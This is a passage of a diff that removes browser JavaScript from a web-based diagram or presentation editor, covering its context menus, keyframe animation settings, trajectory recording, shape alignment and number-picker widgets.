-                str += "<td   style=color:blue onclick=docpp(" + num + ")>C++H</td>";
-                if ((++NN%2) == 0) str += '</tr>';
-            }
-            if (numsselected.length>1 && achain())
-            {
-                if (NN%2 == 0) str += '<tr>';
-                str += "<td   style=color:blue onclick=alignchain()>" + textmsg[1785] + "</td>";
-                if ((++NN%2) == 0) str += '</tr>';
-            }
-            
-        }
-
-        else if (cd== 0)
-        {
-           str += "<tr><td align=left>" + textmsg[1493].replace(/ .*/,'') + "</td><td align=right style=\"background-image:linear-gradient(to right,white,black)\" ><input type=checkbox id=chkgradient ></td></tr>";
-           var a = getdocbg();
-           var fc = 'black';
-           if (a == '' || !isNaN(a.charAt(0))) {fc = 'grey';a = 'http://...';}
-           str += "<tr><td colspan=2><input id=bgurl onchange=setdocbg(this.value) onfocus=removehint(this,'" + a + "') onblur=showhint(this,'" + a + "') style=\"border:1px grey solid;width:89px;font-size:10px;color:" + fc + "\" value=\"" + a + "\"></td></tr>";
-
-           var z = $("selpage");
-           if (z!= null)
-           {
-               var xx = '';
-               for (i=0; i < pagetbl.rows.length-1; i++)
-                   if (i!=pagenum)
-                       xx += "<option value=P" + (i+1) +">";
-
-               if (  numShapes>0  && xx!='')
-               {
-                   str += "<tr><td align=left>" + xs[13] + "</td><td align=right><input onchange=\"mergeto(this)\"  style=\"border:1px;background-color:white;width:35px\" list=pagenums ><datalist id=pagenums>" + xx +"</datalist></td></tr>";
-               }
-                var yy = '';
-                var j = 0;
-                for (i=0; i < numShapes; i++)
-                {
-                    if (allShapes[i]!= null && allShapes[i].visible == 0)
-                    {
-                        if (yy=='')
-                            yy = "<tr><td  colspan=2><table cellspacing=0 cellpadding=0 border=1>";
-                        if (j%2==0)
-                            yy += "<tr height=26>";
-                          xx = tblname(i);
-                        if (xx.length > 7)
-                            xx = xx.substring(0,7).replace(/ /g,'&nbsp;')+"..";
-                        if (allShapes[i].shapename=='rightrect') var kk=0;
-                        else if (allShapes[i].shapename=='roundrect') kk=1;
-                       else if (allShapes[i].shapename=='circle') kk=2;
-                     else if (allShapes[i].shapename=='ellipse') kk=3;
-                          else if (allShapes[i].shapename=='egg') kk=4;
-                           else if (allShapes[i].shapename=='diamond') kk=5;
-                            else if (allShapes[i].shapename=='hexgon') kk=6;
-                            else kk =7;
-                        yy += "<td  colspan=2 align=center valign=middle width=41   onclick=\"switchshow(" + i + ");canceldia(0,0)\"><div stle=width:41px >" + xx  + "</div><div style=\"opacity:0.5;margin:-20px 0px 0px 0px;width:41px\">" + icons[kk] + "</div></td>";
-
-                        if (j%2==1)
-                            yy += "</tr>";
-                        j++;
-                    }
-
-                }
-
-                if (yy!='')
-                {
-                    if (j%2== 0)
-                    {
-                        str += "<td width=30  colspan=2> </td></tr>";
-                    }
-                    str += yy + "</table></td></tr>";
-                }
-
-            }
-
-        }
-        
-       if (editable && cd==1)
-       {
-           if ((NN%2) == 0) str += '<tr>';
-           str += "<td   style=color:blue onclick=copyshape(" + num + ")>" + xs[4] + "</td>";
-           if ((++NN%2) == 0) str += '</tr>';
-       }
-       if (editable && (cd==1 || cd==2 || cd== 4))
-       {
-           if ((NN%2) == 0) str += '<tr>';
-           str += "<td   style=color:blue onclick=dodelete(" + num + "," + cd + ")>" + xs[5] + "</td>";
-           if ((++NN%2) == 0) str += '</tr>';
-       }
-
-       if (editable && cd==0 && cutshape!= null)
-       {
-           if ((NN%2) == 0) str += '<tr>';
-           str += "<td   style=color:blue onclick=pasteshape()>" + xs[7] + "</td>";
-           if ((++NN%2) == 0) str += '</tr>';
-       }
-       if (cd== 3)
-       {
-           var xt = $("toolbar");
-           if (xt.style.position == null || xt.style.position.toLowerCase()!='absolute')
-           {
-               if ((NN%2) == 0) str += '<tr>';
-               str += "<tr><td   style=color:blue onclick=allowmove(0)>" + xs[8] + "</td></tr>";
-               if ((++NN%2) == 0) str += '</tr>';
-           }
-           else
-           {
-               if ((NN%2) == 0) str += '<tr>';
-               str += "<tr><td   style=color:blue onclick=allowmove(0)>" + xs[8] + "</td></tr>";
-               str += "<tr><td   style=color:blue onclick=allowmove(1)>" + xs[9] + "</td></tr>";
-               if ((++NN%2) == 0) str += '</tr>';
-           }
-       }
-       if (cd==1)
-       {
-           var kframe = kframes[pagenum + '_' + num];
-           var self = textmsg[1850].split(/@/)[3];
-           if ((NN%2) == 0) str += '<tr height=16>';
-           str += "<td width=50  style=color:blue><div class=aniexapnd style=\"padding:0px;position:relative;overflow:hidden\"  ><table width=234 align=center style=\"width:230px;margin:0px;border-collapse:collpase;border-radius:4px;border:0px\" border=1  cellpadding=0 cellspacing=0>";
-          str += "<tr height=20><td align=left  width=50 style=\"width:50px !important\" onclick=\"expandmenuani(this,'" + xs[6] + "','" + xs[25] + "')\"><nobr>" + xs[25] + "</nobr></td>"
-     + "<td  width=60 align=center style=color:black ><nobr>" + xs[18] + "</nobr></td>"
-     + "<td  width=60 align=center style=color:black  ><nobr>" + xs[23] + "</nobr></td>"
-     + "<td  width=60 align=center style=color:black   ><nobr>" + xs[24] + "</nobr></td></tr>";
-
-str += "<tr height=20><td  align=left  width=50   style=color:black ><nobr>" + xs[19] + "</nobr></td>";
-str += "<td  width=60  align=center  onclick=choosesn(this," + (kframe!=null?kframe.esn:(-1)) +"," +  num + ",'e') >" + (kframe!=null&&kframe.esn>-1?(''+kframe.esn):self) + "</td>";
-str += "<td v width=60  align=center onclick=choosesn(this," + (kframe!=null?kframe.ssn:(-1)) +"," +  num + ",'s') >" + (kframe!=null&&kframe.ssn>-1?(''+kframe.ssn):self) + "</td>";
-str += "<td  width=60  align=center onclick=choosesn(this," + (kframe!=null?kframe.lsn:(-1)) +"," +  num + ",'l') >" + (kframe!=null&&kframe.lsn>-1?(''+kframe.lsn):self) + "</td></tr>";
-
-str += "<tr height=20><td align=left  width=50   style=color:black  ><nobr>" + xs[20] + "</nobr></td>";
-str += "<td  width=60 onclick=choosets(this," + (kframe!=null&&kframe.ets!=null&&kframe.ets.length>0) +",'e'," +  num + ") align=center>" + (kframe!=null&&kframe.ets!=null&&kframe.ets.length>0?'...':textmsg[801]) + "</td>";
-str += "<td  width=60 align=center onclick=choosets(this," + (kframe!=null && kframe.sts!=null && kframe.sts.length>0) +",'s'," +  num + ") >" + (kframe!=null&&kframe.sts!=null&&kframe.sts.length>0?'...':textmsg[801]) + "</td>";
-str += "<td   align=center onclick=choosets(this," + (kframe!=null&&kframe.lts!=null && kframe.lts.length>0) +",'l'," +  num + ") >" + (kframe!=null&&kframe.lts&&kframe.lts.length>0?'...':textmsg[801]) + "</td></tr>";
-
-str += "<tr height=20><td align=left style=color:black  width=50   ><nobr>" + xs[21] + "</nobr></td>";
-str += "<td width=60 bgcolor=white align=center><input class=right style=color:blue:width:60px size=4 value=\"" +   (kframe!=null?kframe.etm:0)  + "s\" onchange=choosetm(this," + num + ",'etm')></td>"
-str += "<td  width=60  bgcolor=white  align=center><input class=right style=color:blue:width:60px  size=4  value=\"" +   (kframe!=null?kframe.stm:0)  + "s\" onchange=choosetm(this," + num + ",'stm')></td>"
-str += "<td  width=60  bgcolor=white  align=center><input class=right style=color:blue:width:60px  size=4 value=\"" +   (kframe!=null?kframe.ltm:0)  + "s\" onchange=choosetm(this," + num + ",'ltm')></td></tr>"
-
-str += "<tr height=20><td align=left style=color:black >" + xs[22] + "</td>";
-str += "<td  width=60 align=center style=color:black >1</td>";
-str += "<td  width=60  bgcolor=white  align=center>" +  chooseloop(num)  + "</td>";
-str += "<td  width=60  align=center style=color:black >1</td></tr>";
-           str += "</table></div></td>";
-           if ((++NN%2) == 0) str += '</tr>';
-       }
-       if ((NN%2) == 0) str += '<tr>';
-       str += "<td   style=color:blue onclick=canceldia(" + num + "," + cd + ")>" + xs[6] + "</td>";
-       if ((++NN%2) == 0) str += '</tr>';
-       
-       
-       
-       str += "</table></td></tr></table>";
-
-       dv.innerHTML = str;
-
-
-       document.body.appendChild(dv);
-       if (cd!=0)
-           Drag.init($('mdiatitle'),dv);
-       else
-           dv.style.top = '0px';
-
-}
-function expandmenuani(td,cls, ani)
-{
-    var dv = td.parentNode.parentNode.parentNode.parentNode;
-    if (td.innerHTML.replace(/<[^>]*>/g,'') == cls)
-    {
-        dv.className='aniexapnd';
-        td.innerHTML = '<nobr>' + ani + '</nobr>';
-    }
-    else
-    {
-        dv.className='aniexapnd1';
-        td.innerHTML = '<nobr>' + cls + '</nobr>';
-    }
-}
-function redraw4(num,type)
-{
-    for (var i=0; i < numsselected.length; i++)
-    {
-        var num = numsselected[i];
-        allCurves[num].type = type;
-        allCurves[num].redraw();
-    }
-}
-function usethisassn(k,y)
-{
-    for (var i=0; i < numsselected.length; i++)
-    {
-        var num = numsselected[i];
-        var kframe = kframes[pagenum + "_" + num];
-        if (kframe == null)
-        {
-            kframes[pagenum + "_" + num] = kframe = {esn:-1,ets:[],etm:0,ssn:-1,sts:[],stm:0,loop:1,lsn:-1,lts:[],ltm:0};
-        }
-        if (y == 'e') kframe.esn = k;
-        else if (y == 's') kframe.ssn = k;
-        else  kframe.lsn = k;
-    }
-    if (k==-1)
-    tdbeing.innerHTML = 'self';
-    else tdbeing.innerHTML = '' + k;
-    closeprompt1();
-}
-var inkframe =false;
-var innewkframe = false;
-var testingxy, ptindex,intervalhandle=null;
-var frameupdated = false;
-function showts(type,num)
-{
-   var kframe = kframes[pagenum + '_' + num];
-   numbeing = num;
-   if (kframe == null) return;
-   if (type=='e') testingxy = kframe.ets;
-   else if (type=='s') testingxy = kframe.sts;
-   else testingxy = kframe.lts;
-   if (testingxy == null || testingxy.length==0) return;
-   ptindex = 0;
-   var tt = 2000/testingxy.length;
-   if (tt<50) tt = 50;
-   intervalhandle=setInterval(placeobj, tt);
-}
-function placeobj()
-{
-   if (ptindex == testingxy.length)
-   {
-       allShapes[numbeing].base.style.left = allShapes[numbeing].x + 'px';
-       allShapes[numbeing].base.style.top = allShapes[numbeing].y + 'px';
-       clearInterval(intervalhandle);
-       return;
-   }
-   allShapes[numbeing].base.style.left = testingxy[ptindex][0] + 'px';
-   allShapes[numbeing].base.style.top = testingxy[ptindex][1] + 'px';
-   ptindex++;
-}
-var intrajactory=false,trajactory=[];
-function recordts(it,num,y)
-{
-    if (it.value != textmsg[1612])
-    {
-        $('tsxy').innerHTML = textmsg[1853];
-        trajactory=[];
-        intrajactory=true;
-        it.value = textmsg[1612];
-        allShapes[num].base.onDrag = function(nx, ny)
-        {
-           if (trajactory.length == 0) 
-               trajactory[0] =  [nx,ny]; 
-           else if (Math.abs(trajactory[trajactory.length-1][0]-nx)
-                   + Math.abs(trajactory[trajactory.length-1][1]-ny)>9)
-               trajactory[trajactory.length] = [nx,ny]; 
-        }
-    }
-    else
-    {
-         it.value =  textmsg[1482];
-         allShapes[num].base.onDrag = null;
-         if (trajactory.length > 0)
-         {
-            tdbeing.innerHTML = '...';
-            it.previousSibling.style.visibility = 'visible';
-            it.nextSibling.style.visibility = 'visible';
-            var xy = [allShapes[num].x, allShapes[num].y];
-            for (var i=0; i < numsselected.length; i++)
-            {
-                num = numsselected[i];
-                var kframe = kframes[pagenum + '_' + num];
-            if (kframe==null)
-                kframes[pagenum + '_' + num] = kframe = {esn:-1,ets:[],etm:0,ssn:-1,sts:[],stm:0,loop:1,lsn:-1,lts:[],ltm:0};
-
-            intrajactory=false;
-            if (y=='e')
-                kframe.ets = copynew(trajactory,[allShapes[num].x-xy[0], allShapes[num].y-xy[1]]);
-            else if (y == 's')
-                kframe.sts = copynew(trajactory,[allShapes[num].x-xy[0], allShapes[num].y-xy[1]]);
-            else
-                kframe.lts = copynew(trajactory,[allShapes[num].x-xy[0], allShapes[num].y-xy[1]]);
-             $('tsxy').innerHTML =  tsxystr(trajactory);
-         }
-            frameupdated = true;
-        }
-    }
-}
-function tsxystr(xy)
-{
-   var str ='<table>';
-   var j = 0;
-   while (j < xy.length)
-   {
-   str += '<tr><td align=left><table><tr><td>x</td>';
-   for (var i=0,j1=j; i < 30 && j1 < xy.length; i++,j1++)
-   {
-       str += '<td align=right>' + xy[j1][0] + '</td>';
-   }
-   str += '</tr><tr><td>y</td>';
-   for (var i=0; i < 30 && j < xy.length; i++,j++)
-   {
-       str += '<td align=right>' + xy[j][1] + '</td>';
-   }
-   str += '</tr></table></td></tr>';
-   }
-   str += '</table>';
-   return str;
-}
-function choosets(td,tf,type,num)
-{
-   var kframe = kframes[pagenum + '_' + num];
-   if (kframe==null)
-       kframes[pagenum + '_' + num] = kframe = {esn:-1,ets:[],etm:0,ssn:-1,sts:[],stm:0,loop:1,lsn:-1,lts:[],ltm:0};
-   var xy = null;
-   if (type=='e') xy = kframe.ets;
-   else if (type=='s') xy = kframe.sts;
-   else  xy = kframe.lts;
-   var str = '<div id=tsxy>' + tsxystr(xy) + '</div>';
-   tdbeing = td;
-    
-   str += "<center><input type=button class=GreenButton style=width:68px;visibility:" + (tf?"visible":"hidden") + " value=\"" + textmsg[1200] + "\" onclick=showts('" + type + "'," + num + ")>"
-   str += "<input type=button class=OrangeButton style=width:68px value=\"" + textmsg[1482] + "\" onclick=recordts(this," + num + ",'" + type + "')>";
-   
-   if (type=='e')
-       str += "<input type=button class=OrangeButton style=width:68px value=\"" + textmsg[1855].split(/@/)[0] + "\" onclick=randomsingle(this," + num + ")>";
-   if (type=='e' || type=='l')
-       str += "<input type=button class=OrangeButton style=width:68px value=\"" + textmsg[1855].split(/@/)[1] + "\" onclick=from2origin(this," + num + ",'" + type + "')>";
-   str += "<input type=button class=RedButton style=width:68px;visibility:" + (tf?"visible":"hidden") + "  value=\"" + textmsg[69] + "\" onclick=deletets(" + num + ",'" + type + "')></center>"
-   myprompt(str,null,null,y2word(type) + " " + textmsg[1773].split(/@/)[20]);
-   promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[0].cells[0].getElementsByTagName('img')[0].onclick=
-    function()
-    {
-        innewkframe = false;
-        intrajactory=false;
-        closeprompt1();
-    }
-}
-function from2origin(but, num ,type)
-{
-    tdbeing.innerHTML = '...';
-    for (var i=0; i < numsselected.length; i++)
-    {
-        num = numsselected[i];
-        var kframe = kframes[pagenum + '_' + num];
-        if (kframe==null)
-          kframes[pagenum + '_' + num] = kframe = {esn:-1,ets:[],etm:0,ssn:-1,sts:[],stm:0,loop:1,lsn:-1,lts:[],ltm:0};
-        if (type=='e') kframe.ets = [[0,0]]; 
-        else kframe.lts = [[0,0]]; 
-    }
-}
-function randomsingle(but, num )
-{
-    tdbeing.innerHTML = '...';
-    for (var i=0; i < numsselected.length; i++)
-    {
-        num = numsselected[i];
-        var kframe = kframes[pagenum + '_' + num];
-        if (kframe==null)
-           kframe = kframes[pagenum + '_' + num] = {esn:-1,ets:[],etm:0,ssn:-1,sts:[],stm:0,loop:1,lsn:-1,lts:[],ltm:0};
-        var x = Math.floor(Math.random()*(screen.width - 100 - allShapes[num].base.offsetWidth));
-        var y = Math.floor(Math.random()*(screen.height - 150 - allShapes[num].base.offsetHeight));
-        kframe.ets = [[x,y]];  
-        
-    }
-}
-function deletets(num,y)
-{
-    var kframe = kframes[pagenum + '_' + num];
-    if (kframe==null) return;
-    if (y=='e')
-        kframe.ets = [];
-    else if (y == 's')
-        kframe.sts = [];
-    else
-        kframe.lts = [];
-    $('tsxy').innerHTML = '';
-    tdbeing.innerHTML = textmsg[801];
-    frameupdated = true;
-}
-function copynew(arr,xy)
-{
-    var a = [];
-    for (var j=0; j < arr.length; j++)
-        a[j] = [arr[j][0] + (xy==null?0:xy[0]), arr[j][1] + (xy==null?0:xy[1])];
-    return a;
-}
-var tdbeing;
-function choosesn(td, k, num, y)
-{
-    if (numsselected==null)
-        numsselected = [num];
-    numbeing = num;
-    inkframe = true;
-    tdbeing = td;
-    var str = '';
-
-    for (var i= 0; i < kshapes.length; i++)
-    {
-       if (kshapes[i]!=null)
-       {
-           var z = constructshape(i , kshapes[i].replace(/^,/,"   \n  ,"), 0, 0);
-          str += "<div " + (k==i? 'style="border:1px orange solid" ':'') +   " onclick=\"usethisassn(" + i + ",'" + y + "')\" >" + z.base.outerHTML + "</div>";
-           document.body.removeChild(z.base);
-       }
-       else
-       {
-           str += "<div " + (k==i? 'style="border:1px orange solid" ':'') + "  >Invalid</div>";
-       }
-    }
-    str += "<div " + (k==-1? 'style="border:1px orange solid" ':'') + " onclick=\"usethisassn(-1,'" + y + "')\" >" + textmsg[1850].split(/@/)[3] + "</div>";
-    str += "<div style=text-align:center id=sndv></div><br><center><input type=button onclick=newkshape(this," + kshapes.length +  "," + num +  ",'" + y + "') class=GreenButton value=\"" + textmsg[406] + "\"></center>";
-    inkframe = false;
-    myprompt(str,null,null,y2word(y)+textmsg[1773].split(/@/)[19]);
-    bufferedshape = '';
-    promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[0].cells[0].getElementsByTagName('img')[0].onclick=
-    function()
-    {
-        innewkframe = false;
-        if (bufferedshape!='')
-        allShapes[numbeing].parse(bufferedshape);
-        if (numsselected1!=null)
-        {
-            numsselected = [];
-            for(var j=0; j < numsselected1.length; j++)
-            {
-                numsselected[j] = numsselected1[j];
-            }
-        }
-        $('m' +  numsselected[0] + "_1").style.boxShadow = "-" + (numsselected.length*2-2) + "px -" + (numsselected.length-1) + "px #777";
-        closeprompt1();
-    }
-
-}
-function y2word(y)
-{
-   var xs = textmsg[1773].split(/@/);
-   if (y=='e') return xs[18];
-   else if (y=='s') return xs[23];
-   return xs[24]; //Showing@Leaving@Animat
-}
-var bufferedshape;
-function newkshape(dv,n,num,y)
-{
-    if (dv.value == textmsg[406])
-    {
-        innewkframe = true;
-        var t = $('sndv'); t.innerHTML = textmsg[1852].replace(/@/,y2word(y));
-        dv.value = textmsg[1357];
-        if (numsselected1 == null) numsselected1 =[];
-        for(var j=0; j < numsselected.length; j++)
-        {
-            numsselected1[j] = numsselected[j];
-        }
-        if (numsselected.length>1)
-        numsselected.splice(1,numsselected.length-1);
-        $('m' +  numsselected[0] + "_1").style.boxShadow = null;
-        bufferedshape = allShapes[num].toString();
-    }
-    else
-    {
-        dv.value = textmsg[406];
-        for (var i=0; i < numsselected1.length; i++)
-        {
-            var num = numsselected1[i];
-            var kframe = kframes[pagenum + '_' + num];
-            if (kframe==null)
-                kframes[pagenum + '_' + num] = kframe = {esn:-1,ets:[],etm:0,ssn:-1,sts:[],stm:0,loop:1,lsn:-1,lts:[],ltm:0};
-            var wd = allShapes[num].words;
-            allShapes[num].words = "";
-            kshapes[n] = allShapes[num].toString();
-            allShapes[num].words = wd;
-            if (y=='e')
-                kframe.esn = n;
-            else if (y == 's')
-                kframe.ssn = n;
-            else
-                kframe.lsn = n;
-            frameupdated = true;
-        }
-        innewkframe =false;
-        allShapes[numbeing].parse(bufferedshape);
-        allShapes[numbeing].initbase();
-        allShapes[numbeing].init();
-        allShapes[numbeing].setup();
-        for(var j=0; j < numsselected1.length; j++)
-        {
-            numsselected[j] = numsselected1[j];
-        }
-        $('m' +  numsselected[0] + "_1").style.boxShadow = "-" + (numsselected.length*2-2) + "px -" + (numsselected.length-1) + "px #777";
-        closeprompt1();
-    }
-}
-
-function chooseloop(num)
-{
-
-       var kframe = kframes[pagenum + '_' + num];
-       var x = 1;
-       if (kframe!=null)
-       {
-           x = kframe.loop;
-          
-       }
-
-       var i;
-       var str = '<select name=loop size=1 class=right onchange=usethisasloop(this,' + num + ') >';
-       for (  i=1; i <= 10; i++) str += '<option value="' + i + '" ' + (x==i?'selected':'') + '>' + i + '</option>';
-       for ( i=12; i <= 20; i+=2)  str += '<option value="' + i + '" ' + (x==i?'selected':'') + '>'+ i + '</option>';
-       for ( i=25; i <= 50; i+=5)  str += '<option value="' + i + '" ' + (x==i?'selected':'') + '>'+ i + '</option>';
-       str += '<option value="-1" ' + (x==-1?'selected':'') + '>&#8734;</option>';
-       return str + '</select>';
-}
-function usethisasloop(t,num)
-{
-   for (var i=0; i < numsselected.length; i++)
-   {
-       num = numsselected[i];
-       var kframe = kframes[pagenum + '_' + num];
-       if (kframe==null)
-       {
-           kframes[pagenum + '_' + num] = kframe = {esn:-1,ets:[],etm:0,ssn:-1,sts:[],stm:0,loop:1,lsn:-1,lts:[],ltm:0};
-       }
-       if (!isNaN(t.value))
-          kframe.loop = parseInt(t.value);
-       else
-          kframe.loop = -1;
-       frameupdated = true;
-   }
-
-}
-function choosetm(it, num, which)
-{
-   var v = it.value.replace(/[^0-9]/g,''); 
-   for (var i=0; i < numsselected.length; i++)
-   {
-       num = numsselected[i];
-       var kframe = kframes[pagenum + '_' + num];
-       if (kframe==null)
-       {
-           kframes[pagenum + '_' + num] = kframe = {esn:-1,ets:[],etm:0,ssn:-1,sts:[],stm:0,loop:1,lsn:-1,lts:[],ltm:0};
-       }
-       
-       if (which == 'etm')
-          kframe.etm = v;
-       else if (which == 'stm')
-          kframe.stm = v;
-       else if (which == 'ltm')
-          kframe.ltm = v;
-       frameupdated = true;
-   }
-}
-
-function achain()
-{
-
-    var l = 0;
-    if(numsselected == null || numsselected.length < 2) return false;
-
-    while (l < numsselected.length-1)
-    {
-        var k = 0;
-        for (; k < allLines.length; k++)
-        {
-            if (allLines[k] == null) continue;
-            if (allLines[k].startnum == numsselected[l]  && numsselected[1+l] == allLines[k].endnum)
-            break;
-        }
-        if (k == allLines.length) return false;
-        if (allShapes[allLines[k].endnum] == null) return false;
-        l++;
-    }
-    return true;
-
-}
-function alignchain()
-{
-    var i = numsselected[0];
-    var j = numsselected[numsselected.length-1];
-    var x0 = allShapes[i].x + allShapes[i].base.offsetWidth/2;
-    var y0 = allShapes[i].y + allShapes[i].base.offsetHeight/2;
-    var x1 = allShapes[j].x + allShapes[j].base.offsetWidth/2;
-    var y1 = allShapes[j].y + allShapes[j].base.offsetHeight/2;
-    var x = [], y = [];
-    var di = 'v';
-    if (Math.abs(x1-x0) < Math.abs(y1-y0))
-    {
-        x[0] = allShapes[i].x;
-        y[0] = allShapes[i].y;
-        for (i=1; i < numsselected.length; i++)
-        {
-            x[i] = x0 - allShapes[numsselected[i]].base.offsetWidth/2;
-
-            y[i] = y[i-1] + allShapes[numsselected[i-1]].base.offsetHeight + Math.round(0.7*(allShapes[numsselected[i]].fontsize + allShapes[numsselected[i-1]].fontsize));
-        }
-    }
-    else
-    {
-        di = 'h';
-         x[0] = allShapes[i].x;
-        y[0] = allShapes[i].y;
-        for (i=1; i < numsselected.length; i++)
-        {
-            y[i] = y0 -  Math.round(allShapes[numsselected[i]].base.offsetHeight/2);
-            x[i] = x[i-1] + allShapes[numsselected[i-1]].base.offsetWidth + Math.round(0.7*(allShapes[numsselected[i]].fontsize + allShapes[numsselected[i-1]].fontsize));
-        }
-    }
-    for (i=1; i < numsselected.length; i++)
-    {
-
-        allShapes[numsselected[i]].move(x[i], y[i],1);
-        var k = 0;
-        for (; k < allLines.length; k++)
-        {
-            if (allLines[k].startnum == numsselected[i-1]  && numsselected[i] == allLines[k].endnum)
-            {
-               if (di == 'v')
-               {
-                   allLines[k].sx =allShapes[ numsselected[i-1]].base.offsetWidth/2;
-                   allLines[k].sy = allShapes[numsselected[i-1]].base.offsetHeight;
-                   allLines[k].ex = allShapes[numsselected[i]].base.offsetWidth/2;
-                   allLines[k].ey = 0;
-               }
-               else
-               {
-                   allLines[k].sx =allShapes[ numsselected[i-1]].base.offsetWidth;
-                   allLines[k].sy = allShapes[numsselected[i-1]].base.offsetHeight/2;
-                   allLines[k].ex = 0;
-                   allLines[k].ey = allShapes[numsselected[i]].base.offsetHeight/2;
-               }
-               break;
-            }
-        }
-        allLines[k].redraw();
-    }
-
-
-}
-
-function d1(m)
-{
-    var mstr = ''+Math.round(m*10);
-    mstr = mstr.replace(/\..*$/,'');
-    if (mstr.length==1) mstr = "0" + mstr;
-    mstr = mstr.replace(/(.)$/,'.$1');
-    mstr = mstr.replace(/\.0$/,'');
-    return mstr;
-}
-function selectget(td)
-{
-    var or;
-    var nw = -1;
-    if (!isNaN(td.innerHTML)) nw = parseInt(td.innerHTML);
-    if (itemaredoing =='t')
-    {
-        for (var i=0; i <  numaredoing.length; i++)
-        {
-            or = parseInt(selectedtds['t'][i].innerHTML);
-            if (nw >= 0)
-            {
-                 selectedtds['t'][i].innerHTML = ''+ nw;
-                 var n = numaredoing[i];
-                 var num = n%1000;
-                 var cd = (n - num)/1000;
-                 if (cd==1)
-                 allShapes[num].time = nw + (allShapes[num].time- Math.floor(allShapes[num].time));
-                 else if (cd == 2)
-                     allLines[num].time = nw + (allLines[num].time- Math.floor(allLines[num].time));
-                 else 
-                     allCurves[num].time = nw + (allCurves[num].time- Math.floor(allCurves[num].time));
-            }
-            selectedtds['t'][i].style.backgroundColor = 'white';
-        }
-        selectedtds['t'] = null;
-        numaredoing = [];
-    }
-    else if (itemaredoing =='dt')
-    {
-        for (var i=0; i <  numaredoing.length; i++)
-        {
-            if (nw >= 0)
-            {
-                selectedtds['dt'][i].innerHTML = '.'+ nw;
-                 var n = numaredoing[i];
-                 var num = n%1000;
-                 var cd = (n - num)/1000;
-                 if (cd==1)
-                allShapes[num].time = Math.floor(allShapes[num].time) + nw/10.0;
-                 else if (cd == 2)
-                     allLines[num].time = Math.floor(allLines[num].time) + nw/10.0;
-                 else allCurves[num].time = Math.floor(allCurves[num].time) + nw/10.0;
-            }
-            selectedtds['dt'][i].style.backgroundColor = 'white';
-        }
-        selectedtds['dt'] = null;
-
-    }
-    else if (itemaredoing =='do')
-    {
-        for (var i=0; i <  numaredoing.length; i++)
-        {
-           if (nw >= 0)
-           {
-               selectedtds['do'][i].innerHTML = '.'+ nw;
-               var n = numaredoing[i];
-                 var num = n%1000;
-                 var cd = (n - num)/1000;
-                 if (cd==1)
-                   allShapes[num].start = Math.floor(allShapes[num].start) + nw/10.0;
-                 else if (cd==2)
-                  allLines[num].start = Math.floor(allLines[num].start) + nw/10.0;
-                 else
-                   allCurves[num].start = Math.floor(allCurves[num].start) + nw/10.0;
-           }
-           selectedtds['do'][i].style.backgroundColor = 'white';
-        }
-        selectedtds['do'] = null;
-
-    }
-    else if (itemaredoing =='p')
-    {
-        if (nw>=0)
-        tdaredoing.innerHTML = ''+ nw;
-
-    }
-    else if (itemaredoing =='o')
-    {
-        for (var i=0; i <  numaredoing.length; i++)
-        {
-            or =  parseInt(selectedtds['o'][i].innerHTML);
-            selectedtds['o'][i].style.backgroundColor = 'white';
-            if (nw >= 0)
-            {
-                selectedtds['o'][i].innerHTML = ''+ nw;
-                 var n = numaredoing[i];
-                 var num = n%1000;
-                 var cd = (n - num)/1000;
-                 if (cd==1)
-                allShapes[num].start = nw + (allShapes[num].start- Math.floor(allShapes[num].start));
-                 else if (cd == 2)
-                   allLines[num].start = nw + (allLines[num].start- Math.floor(allLines[num].start));
-                 else 
-                     allCurves[num].start = nw + (allCurves[num].start- Math.floor(allCurves[num].start));
-            }
-        }
-        selectedtds['o'] = null;
-
-    }
-    else if (itemaredoing =='z')
-    {
-        for (var i=0; i <  numaredoing.length; i++)
-        {
-            if (nw > -1)
-            {
-                selectedtds['z'][i].innerHTML = ''+ nw;
-                var n = numaredoing[i];
-                 var num = n%1000;
-                 var cd = (n - num)/1000;
-                 if (cd==1)
-                   allShapes[num].zindex = nw;
-              
-            }
-            selectedtds['z'][i].style.backgroundColor = 'white';
-        }
-        selectedtds['z'] = null;
-    }
-    numaredoing = [];
-    var tbl = td.parentNode.parentNode;
-    if (tbl.tagName.toLowerCase()!='table') tbl = tbl.parentNode;
-    tbl = tbl.parentNode;
-    document.body.removeChild(tbl);
-     if (itemaredoing =='p') return;
-    var m = 0;
-    for (var i = 0; i < numShapes; i++)
-    {
-        if (allShapes[i] == null)
-            continue;
-        var d = allShapes[i].start + allShapes[i].time;
-        if (m < d)
-            m = d;
-    }
-    for (var i = 0; i < numLines; i++)
-    {
-        if (allLines[i] == null || allLines[i].startnum>-1 || allLines[i].endnum>-1)
-            continue;
-        var d = allLines[i].start + allLines[i].time;
-        if (m < d)
-            m = d;
-    }
-    for (var i = 0; i < numCurves; i++)
-    {
-        if (allCurves[i] == null)
-            continue;
-        var d = allCurves[i].start + allCurves[i].time;
-        if (m < d)
-            m = d;
-    }
-    var q = $('totaltime');
-
-    if (q!=null) q.innerHTML = '' + d1(m);
-}
-function lessnum(td)
-{
-    var tr = td.parentNode.parentNode;
-    if (tr.tagName.toLowerCase()!='table') tr = tr.parentNode;
-    var n = parseInt(tr.rows[2].cells[0].innerHTML);
-    n -= 20;
-    if (n < 0) n=0;
-    for (var i=2; i < 22; i++)
-       tr.rows[i].cells[0].innerHTML = ''+(n+i-2);
-}
-function addmorenum(td)
-{
-    var tr = td.parentNode.parentNode;
-    if (tr.tagName.toLowerCase()!='table') tr = tr.parentNode;
-    var n = parseInt(tr.rows[21].cells[0].innerHTML)+1;
-    for (var i=2; i < 22; i++)
-       tr.rows[i].cells[0].innerHTML = ''+(n+i-2);
-}
-function selectnum(td,arr,z)
-{
-    tdaredoing = td;
-    var x = document.createElement('div');
-    var n = parseInt(td.innerHTML);
-    var xy = findPositionnoScrolling(td);
-    var zd = (promptwin==null)?(4*numShapes+100):( parseInt(promptwin.style.zIndex)+1 );
-    x.style.cssText = 'position:absolute;left:' + (xy[0]-90) + 'px;z-index:' + zd + ';border:1px grey solid;background-color:lightyellow';
-    var str = '<table width=60>';
-    str += '<tr><td align=right onclick=selectget(this)  >' +   textmsg[18] + '</td></tr>';
-    if (arr.length==20)
-        str += '<tr><td align=right onclick=lessnum(this)  >---</td></tr>';
-    var j = 0;
-    for (var i=0; i < arr.length; i++)
-    {
-        str += '<tr><td align=right onclick=selectget(this)  >' +   (arr[i]) + '</td></tr>';
-        if (arr[0]>=0 && arr[i] == n) j = i;
-    }
-    if (arr.length==20)
